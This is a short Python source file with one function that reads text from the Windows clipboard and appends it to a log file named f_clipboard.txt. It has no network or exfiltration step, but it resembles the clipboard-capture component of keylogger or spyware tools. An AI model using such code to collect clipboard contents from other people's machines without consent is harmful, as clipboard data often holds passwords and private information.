import win32clipboard
import win32con

# Function to copy clipboard contents
def copy_clipboard(file_path):
    with open(f"{file_path}/f_clipboard.txt", "a") as f:
        try:
            win32clipboard.OpenClipboard()
            if win32clipboard.IsClipboardFormatAvailable(win32con.CF_TEXT):
                pasted_data = win32clipboard.GetClipboardData(win32con.CF_TEXT)
                if pasted_data:
                    pasted_data = pasted_data.decode("utf-8")
                    f.write(f"Clipboard Data:\n{pasted_data}\n")
                else:
                    f.write("Clipboard is empty\n")
            else:
                f.write("Text data not available in clipboard\n")
        except win32clipboard.error as e:
            f.write(f"Clipboard access error: {e}\n")
        finally:
            win32clipboard.CloseClipboard()
